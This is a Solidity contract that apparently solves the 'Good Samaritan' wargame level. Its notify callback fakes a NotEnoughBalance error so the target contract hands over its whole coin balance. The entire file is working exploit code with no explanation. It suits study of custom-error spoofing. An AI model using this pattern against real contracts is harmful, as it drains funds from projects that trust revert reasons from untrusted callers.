// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

error NotEnoughBalance();

contract GoodSamaritanAttacker is INotifyable {
    GoodSamaritan public goodSamaritan;
    Coin public coin;
    Wallet public wallet;

    event Record(uint256 indexed balance);

    constructor (GoodSamaritan _goodSamaritan) {
        goodSamaritan = _goodSamaritan;
        coin = _goodSamaritan.coin();
        wallet = _goodSamaritan.wallet();
    }

    function requestDonation() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256) external view override {
        if (coin.balances(address(wallet)) > 0) {
            revert NotEnoughBalance();
        }
    }
}
